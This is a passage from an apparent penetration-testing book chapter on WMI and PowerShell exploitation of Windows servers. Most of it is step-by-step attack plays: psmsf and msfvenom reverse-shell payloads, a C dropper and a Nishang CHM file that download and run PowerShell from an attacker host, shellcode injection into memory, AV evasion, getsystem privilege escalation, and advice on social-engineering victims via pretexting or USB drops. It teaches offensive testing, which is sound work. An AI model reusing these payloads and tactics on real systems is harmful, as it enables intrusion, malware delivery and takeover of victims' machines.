    <p>WMI core components are present by default in all Windows OS versions from Windows 2000 and after. Previous Windows releases can run WMI, but the components have to be installed.  </p>

    <p>Windows Server 2008 included the minimalistic Server Core, smaller codebase, no GUI (less attack surface).  </p>

    <p>Windows Server 2012 added the ability to switch between GUI and Server Core.  </p>

    <p>Windows Server 2016 added Nano Server to the mix of options. Nano Server has what they call a minimal footprint and is headless. It excludes the local GUI, and all management is carried out via WMI, PowerShell, and Remote Server Management Tools (a collection of web-based GUI and command line tools). In Technical Preview 5 (2016-04-17), the ability to manage locally using PowerShell was added. So we see the continued commitment to support these tools going forward, so they will continue to be excellent attack vectors and play an important part in the attackers toolbox and attack surface.  </p>

    <p><a href="https://msdn.microsoft.com/en-us/library/aa394570(v=vs.85).aspx">WMI Providers</a> provide interfaces for configuring and monitoring Windows services, along with programming interfaces for consumption via custom built tools.  </p>

    <p>WMI needs to be accessible for remote access, of which there are step(s) to make sure this is the case. These step(s), vary depending according to the specific Windows release and other configurations.  </p>

    <p>Rather than relying on SMB via the psexec technique, starting a service on the target, the <code>wmi</code> module executes PowerShell on the target using the current user credentials or those that you supply, so this is still a PTH technique. We use the WMI Command-line (WMIC) to <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/wmic.rb#L48">start a Remote Procedure Call</a> on TCP port 135 and an ephemeral port. Then create a <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/wmi.rb#L61">ReverseListenerComm</a> to tunnel traffic through that session</p>
  </li>
</ol>

<h5 id="vps-identify-risks-powershell">PowerShell</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p><a href="https://blogs.msdn.microsoft.com/powershell/2008/10/28/powershell-will-be-installed-by-default-on-windows-server-08-r2-ws08r2-and-windows-7-w7/">By default</a>, PowerShell is installed on Windows Server 2008 R2 and Windows 7 onwards.</p>

<p>PowerShell <em>is going to be on all boxes and it going provide access to everything on the box</em> This is excellent news for penetration testers and other attackers!</p>

<p>On Windows Server from PowerShell 4.0 onwards (Windows 8.1, Server 2012 R2), the default execution policy is RemoteSigned, but that is easily overridden in a script as you will see soon. We:</p>

<ul>
  <li>Have full direct access to the Win32 API</li>
  <li>Have full access to the .Net framework</li>
  <li>Can assemble malicious shell code in memory without AV detection</li>
</ul>

<p>Then you just need to get some code run on your targets machine. There are many ways to achieve this. Off the top of my head:</p>

<ul>
  <li>Find someone that your target trusts and become (pretext) them, services like LinkedIn are good for this, as that will generally allow you to piece the organisations structure together with freely available OSINT that will not ring any alarm bells. It is pretty easy to build a decent replica of the organisations trust structure this way. Then you will have implicit trust. They will run your code or open your office document</li>
  <li>Just befriend your target or someone close enough to your target inside the target organisation, have them run your code once they trust you. Then traverse once you have persistence on their machine</li>
  <li>Find someone that usually sends files or links to files via email or similar and spoof the from address as discussed in the People chapter.</li>
  <li>CD, DVD, USB stick drops, etc.</li>
  <li>Using existing credentials you obtained by any of the means detailed in the People chapter and maybe logging into Outlook Web Access (OWA) or similar. Most people still use the same or similar passwords for multiple accounts. You only need one of them from someone on the targets network.</li>
</ul>

<p>Metasploit or setoolkit generating office files or pdfs usually trigger AV, but this is much easier to get around with PowerShell.</p>

<p>Traditionally the payload would have to be saved to the targets file system, but with PowerShell and other scripting languages, the payload can remain in memory, this defeats many AV products along with <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids">HIDS/HIPS</a>. AV vendors continue to get better at detecting malware that is compiled to native assembly, but they struggle to interpret the intent of scripts, as it is so easy to make changes to the script, but keep the script intent doing the same thing. To make matters worse, PowerShell is tightly integrated now with the Windows Operating Systems.</p>

<p>So what we are doing is making our viruses and payloads look like chameleons or business as usual (BAU), to detection mechanisms.</p>

<h5 id="vps-identify-risks-powershell-exploitation-via-executable-psmsf">PowerShell Exploitation via Executable C/- <a href="https://github.com/nixawk/psmsf">Psmsf</a>
</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>



<figure class="image center" style="width: 396px;">
  <img src="images/HandsOnHack.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<aside class="information blurb">
    <h3 id="leanpub-auto-synopsis-1">Synopsis</h3>

  <p>In this play, we will use <code>psmsf</code> to create a Metasploit resource file to get <code>msfconsole</code> on our attacking machine listening for a reverse tcp shell from our target.  <code>psmsf</code> will also leverage  <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/"><code>msfvenom</code></a> to create native windows shellcode from c. <code>psmsf</code> inserts this shellcode into a PowerShell script then base64 encodes the script, and adds it to a text file prefixed with a PowerShell command to run the base64 encoded PowerShell script.</p>

  <p>We then upload / host the payload generated by <code>psmsf</code>.</p>

  <p>We then create a small c file (that we call the virus) that downloads and executes the PowerShell paylaod we have hosted. The c file needs to be compiled on the target platform, and given to our victim to run.</p>

  <p>Our target runs the virus.<br />
The virus downloads and executes the payload.<br />
The payload runs the base64 encoded script inside it, which spawns a thread and runs immediately from the calling instance of PowerShell which executes a section of memory that we over-write with the shellcode. This runs the reverse shell that the attacking machine is listening for.</p>

</aside>

<p>Meterpreter is an excellent platform for attacking with. It provides us with many useful tools which make tasks like privilege escalation, establishing persistence, lateral movement, pivoting, and others, much easier.</p>

<p>The shellcodes available in <code>psmsf</code> are the following <code>msfvenom</code> payloads, of which the second one we use in this play:</p>

<ul>
  <li><code>windows/shell/reverse_tcp</code></li>
  <li><code>windows/meterpreter/reverse_tcp</code></li>
  <li><code>windows/meterpreter/reverse_http</code></li>
</ul>

<p>You can find the video of how this attack is played out at <a href="https://youtu.be/a01IJzqYD8I">https://youtu.be/a01IJzqYD8I</a>.</p>

<p>If you do not already have <code>psmsf</code> on your attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.</p>

<aside class="generic_inbar blurb bomb icon-bomb">
    <h3 id="powershell-exploitation-with-psmsf-play">The Play</h3>

  <p>Go ahead and run <code>python psmsf</code>, you will be provided with the details you need to take the next steps.</p>

  <p>Next we run:<br />
<code>/opt/psmsf$ python psmsf --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost &lt;listener-attack-ip&gt; --lport 4444</code></p>

  <p>If you do not specify an output directory for the attack files that <code>psmsf</code> creates, it will create the <code>powershell_attack</code> directory in your current directory, then generate the PowerShell attack files for you within it. The two PowerShell attack files are:<br />
1. <code>powershell_msf.rc</code> (the resource file we can feed to <code>msfconsole</code>), looks like:<br />
<code>use exploit/multi/handler</code><br />
<code>set payload windows/meterpreter/reverse_tcp</code><br />
<code>set LHOST &lt;listener-attack-ip&gt;</code><br />
<code>set LPORT 4444</code><br />
<code>set ExitOnSession false</code><br />
<code>set EnableStageEncoding true</code><br />
<code>exploit -j</code><br />
2. <code>powershell_hacking.bat</code> (the PowerShell base64 encoded payload with embedded shellcode). This can be <a href="chap03.html#powershell_hacking-bat">seen below</a>.</p>

  <p>Start your listener using the <code>powershell_msf.rc</code> resource rile:<br />
<code>msfconsole -r powershell_msf.rc</code><br />
or just load the same parameters from the resource file once you have msfconsole running, and follow with: <code>exploit -j</code></p>

  <p><code>msf exploit(handler) &gt; exploit -j</code><br />
<code>[*] Exploit running as background job.</code><br />
<code>[*] Started reverse TCP handler on &lt;listener-attack-ip&gt;:4444</code><br />
<code>[*] Starting the payload handler...</code><br />
<code>msf exploit(handler) &gt;</code>  </p>

  <p>The target now needs to run the payload <code>powershell_hacking.bat</code>. This can be run anywhere that PowerShell is available, and it will open a reverse meterpreter shell which is embedded within the <code>powershell_hacking.bat</code> payload to your listener. Some options:<br />
* Copy paste the contents of the file into a Windows terminal<br />
* Run the file directly: <code>cmd.exe /c powershell_hacking.bat</code></p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>Either of these two options are fine if you have access to the targets machine. If not, you will really need to conceal your true intent from the target that we have built a trust relationship with. We need to hide not only the payload (intent) contents, but also the code (virus) that fetches the payload and runs it (not yet discussed).</p>

  <p>Host your payload:</p>

  <p>Copy <code>powershell_hacking.bat</code> so our target can unknowingly fetch and run it, you can call it anything, as long as the following commands reference it:<br />
<code>/opt/psmsf/powershell_attack$ sudo cp powershell_hacking.bat /var/www/html/payload.txt</code></p>

  <p>Start your web server:<br />
<code>Service apache2 start</code><br />
<code>curl &lt;listener-attack-ip&gt;/payload.txt</code> or just browse the payload to verify that it is hosted.</p>

  <p>Now let us create our binary virus, we will write this in c. I am going to call this <code>download-payload-execute.c</code> because that is what it does. Obviously you would want to call it something that your target felt comfortable running. This is what it looks like:</p>

</aside>

<figure class="code" id="download-psmsf-payload-execute">
  <figcaption>download-payload-execute</figcaption>

<div class="highlight"><pre><code></code><code class="cp">#include</code><code class="cpf">&lt;stdio.h&gt;</code><code class="cp"></code>
<code class="cp">#include</code><code class="cpf">&lt;stdlib.h&gt;</code><code class="cp"></code>
<code class="kt">int</code> <code class="nf">main</code><code class="p">()</code>
<code class="p">{</code>
  <code class="c1">// Once the following line has executed, we will have our shell.</code>
  <code class="c1">// system executes any command string you pass it.</code>
  <code class="c1">// noprofile causes no profile scripts to be loaded up front.</code>
  <code class="c1">// Set executionpolicy to bypass will enable script execution for this session, telling PS</code>
  <code class="c1">// to trust that you know what you are doing in downloading -&gt; running scripts.</code>
  <code class="c1">// Invoke the EXpression: download the payload and execute it.</code>
  <code class="c1">// Providing the payload does not trigger anti-virus, this should not.</code>
  <code class="n">system</code><code class="p">(</code><code class="s">"powershell.exe -noprofile -executionpolicy bypass </code><code class="se">\"</code><code class="s">IEX ((new-object net.webclient)\</code>
<code class="s">.downloadstring('http://&lt;listener-attack-ip&gt;/payload.txt '))</code><code class="se">\"</code><code class="s">"</code><code class="p">);</code>

  <code class="c1">// Add content here to make your target think this is a legitimate helpful tool.</code>
  <code class="c1">// Or just do nothing and you may have to explain to your target that it is broken.</code>
  <code class="c1">// Add the following if you want the terminal to stay open.</code>
  <code class="c1">//char buff[10];</code>
  <code class="c1">//fgets (buff, sizeof(buff), stdin);</code>
<code class="p">}</code>
</pre></div>

</figure>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>With this, neither the payload or the virus should trigger anti-virus.</p>

  <p>Now you will need a c compiler on a system of the same architecture as your target. I set-up MinGW in the Tooling Setup chapter under Windows, so you should be good to compile the virus.</p>

  <p><code>gcc download-payload-execute.c -o download-payload-execute.exe</code></p>

  <p>This should provide you with an executable that AV will be happy about. You just need to convince your target to run it. When they do, your listener will catch the reverse_tcp shell.</p>

  <p>Target runs virus. Attacker sees:</p>

  <p><code>[*] Encoded stage with x86/shikata_ga_nai</code><br />
<code>[*] Sending encoded stage (958029 bytes) to &lt;target-ip&gt;</code><br />
<code>[*] Meterpreter session 6 opened (&lt;listener-attack-ip&gt;:4444 -&gt; &lt;target-ip&gt;:63814) at 2016-12-28 15:31:29 +1300</code><br />
<code>msf exploit(handler) &gt;</code></p>

  <p>Now we have our shell. Type <code>sessions</code> to see its details:</p>

  <p><code>msf exploit(handler) &gt; sessions</code></p>

  <p><code>Active sessions</code><br />
<code>===============</code>  </p>

  <p><code>Id  Type                     Information              Connection</code><br />
<code>--  ----                     -----------              ----------</code><br />
<code>6  meterpreter x86/windows  &lt;target-host&gt;\kim @ &lt;target-host&gt;  &lt;listener-attack-ip&gt;:4444 -&gt; &lt;target-ip&gt;:63814 (&lt;target-ip&gt;)</code></p>

  <p>To interact with your shell:</p>

  <p><code>msf exploit(handler) &gt; sessions -i 6</code><br />
<code>[*] Starting interaction with 6...</code></p>

  <p><code>meterpreter &gt;</code></p>

  <p>Check to see which user you are running with, this will be the user that ran the virus. If you convinced your target to run as admin, then you will be able to elevate your privileges very easily (I did not do this in the video demo), otherwise you will have to try one of the other seemingly infinite techniques.</p>

  <p><code>meterpreter &gt; getuid</code><br />
<code>Server username: &lt;target-host&gt;\kim</code></p>

  <p><code>meterpreter &gt; pwd</code><br />
<code>C:\Users\kim\Desktop</code></p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>Check which extensions we have loaded:</p>

  <p><code>meterpreter &gt; use -l</code><br />
<code>espia</code><br />
<code>extapi</code><br />
<code>incognito</code><br />
<code>kiwi</code><br />
<code>lanattacks</code><br />
<code>mimikatz</code><br />
<code>powershell</code><br />
<code>priv</code><br />
<code>python</code><br />
<code>sniffer</code><br />
<code>stdapi</code><br />
<code>winpmem</code></p>

  <p>If <code>priv</code> was not in the list, try load it with <code>use priv</code>.<br />
Let us try for system, if this is not successful, try running <code>run bypassuac</code> first:</p>

  <p><code>meterpreter &gt; getsystem -h</code><br />
<code>Usage: getsystem [options]</code></p>

  <p><code>Attempt to elevate your privilege to that of local system.</code></p>

  <p><code>OPTIONS:</code></p>

  <p><code>-h        Help Banner.</code><br />
<code>-t &lt;opt&gt;  The technique to use. (Default to '0').</code><br />
<code>0 : All techniques available</code><br />
<code>1 : Named Pipe Impersonation (In Memory/Admin)</code><br />
<code>2 : Named Pipe Impersonation (Dropper/Admin)</code><br />
<code>3 : Token Duplication (In Memory/Admin)</code></p>

  <p><code>meterpreter &gt; getsystem</code><br />
<code>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</code>  </p>

  <p><code>meterpreter &gt; getuid</code><br />
<code>Server username: NT AUTHORITY\SYSTEM</code></p>

  <p>No issue with anti-virus at all.<br />
That is the easy part done, now you would need to setup persistence, and start moving laterally through the network.</p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p><code>meterpreter &gt; exit</code><br />
<code>[*] Shutting down Meterpreter...</code></p>

  <p><code>[*] &lt;target-ip&gt; - Meterpreter session 6 closed.  Reason: User exit</code></p>

  <p><code>msf exploit(handler) &gt; jobs -l</code></p>

  <p><code>Jobs</code><br />
<code>====</code></p>

  <p><code>Id  Name                    Payload                          Payload opts</code><br />
<code>--  ----                    -------                          ------------</code><br />
<code>6   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://&lt;listener-attack-ip&gt;:4444</code></p>

  <p><code>msf exploit(handler) &gt; jobs -K</code><br />
<code>Stopping all jobs...</code>  </p>

  <p><code>msf exploit(handler) &gt; jobs -l</code></p>

  <p><code>Jobs</code><br />
<code>====</code></p>

  <p><code>No active jobs.</code></p>

  <p><code>ss -ant</code> Will confirm that we are not listening on <code>4444</code> any more.</p>

</aside>

<h6 id="vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details">PowerShell Payload creation details</h6>

<p>When <code>psmsf</code> is run as per above, the Metasploit <code>windows/meterpreter/reverse_tcp</code> shellcode is generated by running <code>msfvenom</code> programmatically as the following:  </p>

<figure class="code">
<div class="highlight"><pre><code></code>msfvenom --payload windows/meterpreter/reverse_tcp <code class="nv">LHOST</code><code class="o">=</code>&lt;listener-ip&gt; <code class="nv">LPORT</code><code class="o">=</code><code class="m">4444</code> StagerURILe<code class="se">\</code>
<code class="nv">ngth</code><code class="o">=</code><code class="m">5</code> <code class="nv">StagerVerifySSLCert</code><code class="o">=</code><code class="nb">false</code> --encoder x86/shikata_ga_nai --arch x86 --platform windows -<code class="se">\</code>
-smallest --format c
<code class="c1"># msfvenom --help-formats # Lists all the formats available with description.</code>
<code class="c1"># msfvenom --list encoders # Lists all the encoders available with description.</code>
</pre></div>

</figure>

<p><code>psmsf</code> then takes the generated output and in a function called <a href="https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L47"><code>extract_msf_shellcode</code></a> strips out the characters that do not actually form part of the raw shellcode, like an assignment to a char array, double quotes, new lines, semicolons, white space, etc, and just leaves the raw shellcode.</p>

<p><code>psmsf</code> then replaces any instances of <code>\x</code> with <code>0x</code>.</p>

<p><code>psmsf</code> then passes the cleaned up <code>reverse_tcp</code> shellcode to a function called <a href="https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L83-L103"><code>generate_powershell_script</code></a> that embeds it into a PowerShell script that is going to become the main part of our payload.</p>

<p>That code looks like the following, I have added the annotations to help you understand how it works:</p>

<figure class="code">
  <figcaption>psmsf</figcaption>

<div class="highlight"><pre><code></code><code class="k">def</code> <code class="nf">generate_powershell_script</code><code class="p">(</code><code class="n">shellcode</code><code class="p">):</code>
  <code class="n">shellcode</code> <code class="o">=</code> <code class="p">(</code>
    <code class="c1"># Assign a reference to the string that is the C# signature of the VirtualAlloc,</code>
    <code class="c1">#   CreateThread, and memset function... to $c.</code>
    <code class="c1"># Assign a reference to the string that starts immediately before $c and finishes at</code>
    <code class="c1">#   the end of the Start-sleep command... to S1.</code>
    <code class="s2">"$1 = '$c = ''"</code>
    <code class="c1"># Import the kernel32.dll that has the native VirtualAlloc function we later use</code>
    <code class="c1">#   to provide us with the starting position in memory to write our shellcode to.</code>
    <code class="s2">"[DllImport(</code><code class="se">\"</code><code class="s2">kernel32.dll</code><code class="se">\"</code><code class="s2">)]"</code>
    <code class="s2">"public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocatio</code><code class="se">\</code>
<code class="s2">nType, uint flProtect);"</code>
    <code class="s2">"[DllImport(</code><code class="se">\"</code><code class="s2">kernel32.dll</code><code class="se">\"</code><code class="s2">)]"</code>
    <code class="s2">"public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, In</code><code class="se">\</code>
<code class="s2">tPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"</code>
    <code class="s2">"[DllImport(</code><code class="se">\"</code><code class="s2">msvcrt.dll</code><code class="se">\"</code><code class="s2">)]"</code>
    <code class="s2">"public static extern IntPtr memset(IntPtr dest, uint src, uint count);"</code>
    <code class="s2">"'';"</code>

    <code class="c1"># Add a VirtualAlloc, CreateThread, and memset functions of the C# signatures we</code>
    <code class="c1">#   assigned to $c to the PowerShell session as static methods</code>
    <code class="c1">#   of a class that Add-Type is about to create on the fly.</code>
    <code class="c1"># Add-Type uses Platform Invoke (P/Invoke) to call the VirtualAlloc, CreateThread,</code>
    <code class="c1">#   and memset functions as required from the kernel32.dll.</code>
    <code class="c1"># The Name and namespace parameters are used to prefix the new type. passthru is used</code>
    <code class="c1">#   to create an object that represents the type which is then assigned to $w</code>
    <code class="s2">"$w = Add-Type -memberDefinition $c -Name </code><code class="se">\"</code><code class="s2">Win32</code><code class="se">\"</code><code class="s2"> -namespace Win32Functions -passthru;"</code>

    <code class="c1"># Create Byte array and assign our prepped reverse_tcp shellcode.</code>
    <code class="s2">"[Byte[]];[Byte[]]"</code>
    <code class="s2">"$z = </code><code class="si">%s</code><code class="s2">;"</code>
    <code class="s2">"$g = 0x1000;"</code>
    <code class="s2">"if ($z.Length -gt 0x1000){$g = $z.Length};"</code>

    <code class="c1"># Starting at the first virtual address in the space of the calling process</code>
    <code class="c1">#   (which will be a PowerShell instance),</code>
    <code class="c1"># allocate 0x1000 bytes, set to zero, but only when a caller first accesses</code>
    <code class="c1">#   when we memset below,</code>
    <code class="c1"># https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx</code>
    <code class="c1"># &amp; set execute, read-only, or read/write access (0x40) to the committed region of pages.</code>
    <code class="c1"># https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx</code>
    <code class="c1"># Essentially just allocate some (all permissions) memory at the start of PowerShell</code>
    <code class="c1">#   that is executing this &amp; assign the base address of the allocated memory to $x.</code>

    <code class="s2">"$x=$w::VirtualAlloc(0,0x1000,$g,0x40);"</code>

    <code class="c1"># Set the memory that $x points to</code>
    <code class="c1">#   (first 0x1000 bytes of the calling PowerShell instance) to the memory</code>
    <code class="c1">#   that $z points to (the (reverse shell) shellcode that msvenom gives us).</code>
    <code class="s2">"for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};"</code>
    <code class="c1"># Create a thread to execute within the virtual address space of the calling PowerShell</code>
    <code class="c1">#   (which happens on the last line).</code>
    <code class="c1"># The third parameter represents the starting address of the thread,</code>
    <code class="c1">#   the shellcode to be executed by the thread.</code>
    <code class="c1"># Setting the fifth parameter to 0 declares that the thread should run</code>
    <code class="c1">#   immediately after creation.</code>
    <code class="c1"># https://msdn.microsoft.com/en-us/library/windows/desktop/ms682453(v=vs.85).aspx</code>
    <code class="s2">"$w::CreateThread(0,0,$x,0,0,0);"</code>
    <code class="c1"># Start-sleep just provides some time for the shellcode (reverse shell) to execute.</code>
    <code class="s2">"for (;;){Start-sleep 60};';"</code>
    <code class="c1"># The last single quote above is the end of the string that is assigned to $1.</code>
    <code class="c1"># $e is assigned the base 64 encoded string that $1 references.</code>
    <code class="s2">"$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));"</code>
    <code class="s2">"$2 = </code><code class="se">\"</code><code class="s2">-enc </code><code class="se">\"</code><code class="s2">;"</code>

    <code class="c1"># Check if the current process is 64 bit (8 bytes), or something else (32 bit assumed),</code>
    <code class="c1">#   then Invoke EXpression (at specific 64 bit path or 32 bit) PowerShell with base64</code>
    <code class="c1">#   encoded $e, which references the now base64 encoded string (most of this script).</code>

    <code class="s2">"if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + </code><code class="se">\"</code><code class="s2">\syswow64\WindowsPowerShell</code><code class="se">\\</code><code class="s2">v1.0\powe</code><code class="se">\</code>
<code class="s2">rshell</code><code class="se">\"</code><code class="s2">;iex </code><code class="se">\"</code><code class="s2">&amp; $3 $2 $e</code><code class="se">\"</code><code class="s2">}else{;iex </code><code class="se">\"</code><code class="s2">&amp; powershell $2 $e</code><code class="se">\"</code><code class="s2">;}"</code>
    <code class="o">%</code> <code class="n">shellcode</code>
  <code class="p">)</code>

  <code class="k">return</code> <code class="n">shellcode</code>
</pre></div>

</figure>

<p>is psmsf <a href="https://github.com/nixawk/psmsf/blob/master/License.txt">licensed</a> with BSD License.</p>

<p>The <code>powershell_hacking.bat</code> that we copy to our web hosting directory as <code>payload.txt</code>, is the result of the content referenced by the above returned reference to the shellcode variable after it has been <code>utf_16_le</code> encoded then base 64 encoded. This occurs in the <a href="https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L108"><code>generate_powershell_command</code></a> as follows:</p>

<figure class="code" id="powershell_hacking-bat">
<div class="highlight"><pre><code></code><code class="c1"># Gives us powershell_hacking.bat</code>
<code class="n">shellcode</code> <code class="o">=</code> <code class="n">base64</code><code class="o">.</code><code class="n">b64encode</code><code class="p">(</code><code class="n">shellcode</code><code class="o">.</code><code class="n">encode</code><code class="p">(</code><code class="s1">'utf_16_le'</code><code class="p">))</code>
<code class="k">return</code> <code class="s2">"powershell -window hidden -enc </code><code class="si">%s</code><code class="s2">"</code> <code class="o">%</code> <code class="n">shellcode</code>
</pre></div>

</figure>

<h5 id="vps-identify-risks-powershell-exploitation-evolution">PowerShell Exploitation Evolution</h5>

<p>After working with PowerShell exploitation for a few weeks, what quickly becomes apparent is how powerful, easy and effective exploitation and post-exploitation is with the PowerShell medium. There are many tools and modules available to use, often some will not quite work, then you will find a similar variant that someone has taken and improved that does the job adequately. For example, the attack I just demonstrated was based on the Trustedsec <a href="https://github.com/trustedsec/unicorn/blob/6f245ebe0c4ab465f15edea12767604120dd0276/unicorn.py#L362-L363">unicorn.py</a> which did not quite work for me. Then upstream of unicorn is <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1">Invoke-Shellcode.ps1</a> of the PowerShellMafia PowerSploit project, which looks to be in good shape. Matt Graebers technique of injecting a given shellcode into the running instance of PowerShell is the common theme running through the PowerShell shellcode injection exploits used in a number of projects. Matt <a href="http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html">blog posted</a> on this technique in 2011 which is very similar to what we just used above with Psmsf. The landscape is very fluid, but there are always options and usually without requiring any code modifications.</p>

<p>The Veil-Frameworks Veil-Evasion has a similar <a href="https://github.com/Veil-Framework/Veil-Evasion/tree/master/modules/payloads/powershell">set of payloads</a> that @harmj0y <a href="https://www.veil-framework.com/powershell-payloads/">blog posted</a> on. Kevin Dick also wrote a decent <a href="http://threat.tevora.com/dissecting-veil-evasion-powershell-payloads-and-converting-to-a-bind-shell/">blog post</a> on these.</p>

<p>
  <strong>Problems with the other payloads</strong>
</p>

<p>When I tested the payload generated by version 7.4.3 of <code>setoolkit</code>:<br />
<code>1) Social Engineering Attacks</code> -&gt; <code>9) Powershell Attack Vectors</code> -&gt;  <code>1) Powershell Alphanumeric Shellcode Injector</code>, it did not work, this <a href="https://github.com/trustedsec/social-engineer-toolkit/issues/344#issuecomment-269379009">may have been fixed</a> in a later version.</p>

<h5 id="vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang">PowerShell Exploitation via Office Documents C/- <a href="https://github.com/samratashok/nishang">Nishang</a>
</h5>

<figure class="image center" style="width: 395px;">
  <img src="images/ThreatTags----average-common-difficult-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Running an executable or convincing your target to run it works in many cases, but other options like office documents can work well also. Nishang is a framework and collection of scripts and payloads that empower us to use PowerShell for all phases of penetration testing. Amongst the many goodies in Nishang is a collection of scripts which can <a href="https://github.com/samratashok/nishang/tree/1b5aca1a1eb170befccf1d111e8902285d553289/Client">create office documents</a> such as Word, Excel, CHM and a handful of others.</p>


<figure class="image center" style="width: 396px;">
  <img src="images/HandsOnHack.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<aside class="information blurb">
    <h3 id="leanpub-auto-synopsis-2">Synopsis</h3>

  <p>This play is identical in all areas to the last one, except that we swap the <code>download-payload-execute.exe</code> for a chm virus (<code>doc.chm</code>) that does the same thing (download and invoke the payload file content). We will use the <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1"><code>Out-CHM</code></a> <code>nishang</code> script to create the <code>doc.chm</code> file that downloads and invokes the same <code>powershell_hacking.bat</code> that we hosted as <code>http://&lt;listener-attack-ip&gt;/payload.txt</code>, which as discussed in the <a href="chap03.html#vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details">PowerShell Payload creation details</a> above, overwrites the first 0x1000 bytes of the calling instance of PowerShell with the reverse shell that <code>msvenom</code> provided to <code>psmsf</code> and then creates a thread in the virtual address space of the calling PowerShell instance and declares that it should be run immediately.</p>

  <p>The <code>doc.chm</code> or what ever you decide to call it, can be emailed, put on a USB stick, or DVD, and given to your trusting target, or simply leave a few suitably labelled copies lying in a place that will take advantage of our targets curiosity.</p>

</aside>

<p>I have not provided a video with this play as it is very similar to the previous one.</p>

<p>If you do not already have <code>nishang</code> on your Windows attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.</p>

<aside class="generic_inbar blurb bomb icon-bomb">
    <h3 id="powershell-exploitation-via-office-documents">The Play</h3>

  <p>Follow the directions from the <a href="chap03.html#powershell-exploitation-with-psmsf-play">Powershell Exploitation with Psmsf</a> play from above, but just swap out the section where we created the c virus and replace with the following:</p>

  <p>The following PowerShell commands are executed as a low privileged user in ISE from the following foler:<br />
<code>C:\Source\nishang\Client</code><br />
<code>Import-Module .\Out-CHM.ps1</code></p>

</aside>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c"># The command to create the CHM:</code>
<code class="nb">Out-CHM</code> <code class="n">-PayloadScript</code> <code class="n">C</code><code class="err">:</code><code class="p">\</code><code class="n">Users</code><code class="p">\</code><code class="n">kim</code><code class="p">\</code><code class="n">Desktop</code><code class="p">\</code><code class="n">persistentFetchRunPayload</code><code class="p">.</code><code class="n">ps1</code> <code class="err"></code><code class="n">HHCPath</code> <code class="err"></code><code class="n">C</code><code class="err">:</code><code class="p">\</code><code class="n">Progra</code><code class="p">\</code>
<code class="n">m</code> <code class="n">Files</code> <code class="p">(</code><code class="n">x86</code><code class="p">)\</code><code class="n">HTML</code> <code class="n">Help</code> <code class="n">Workshop</code><code class="err"></code>
<code class="c"># persistentFetchRunPayload.ps1 contains the following:</code>
<code class="n">IEX</code> <code class="p">((</code><code class="nb">new-object</code> <code class="n">net</code><code class="p">.</code><code class="n">webclient</code><code class="p">).</code><code class="n">downloadstring</code><code class="p">(</code><code class="s1">'http://&lt;listener-attack-ip&gt;/payload.txt '</code><code class="p">))</code>
</pre></div>

</figure>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>This does not get persisted, but we use the same file below in <a href="chap03.html#vps-identify-risks-adding-persistence-co-powersploit">Adding Persistence C/- PowerSploit</a> where the contents is persisted.</p>

  <p>Now you should see a <code>doc.chm</code> created in the folder that you ran the above command from.</p>

  <p>Now you need to get the <code>doc.chm</code> onto your targets machine or a network share that your target can access/copy from, and persuade your target to run the <code>doc.chm</code>. When they do, the results will be the same as we saw in the <a href="chap03.html#powershell-exploitation-with-psmsf-play">Powershell Exploitation with Psmsf</a> play from above from where the target runs the virus.</p>

</aside>

<h5 id="vps-identify-risks-adding-persistence-co-meterpreter">Adding Persistence C/- Meterpreter</h5>

<p>Metasploit had a Meterpreter script called <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/"><code>persistence.rb</code></a> that could create a persistent (survive reboots, and most other actions a user will take) reverse shell, these scripts are no longer supported. If you try to use it, you will probably get an error like: <code>windows version of Meterpreter is not supported with this Script</code></p>

<p>Now the <a href="https://github.com/rapid7/metasploit-framework/issues/6904"><code>exploit/windows/local/persistence</code></a> module is recommended for persistence. AV picks this up on reboot though, so you probably will not get far with this. </p>

<h5 id="vps-identify-risks-adding-persistence-co-powersploit">Adding Persistence C/- <a href="https://github.com/PowerShellMafia/PowerSploit/">PowerSploit</a>
</h5>

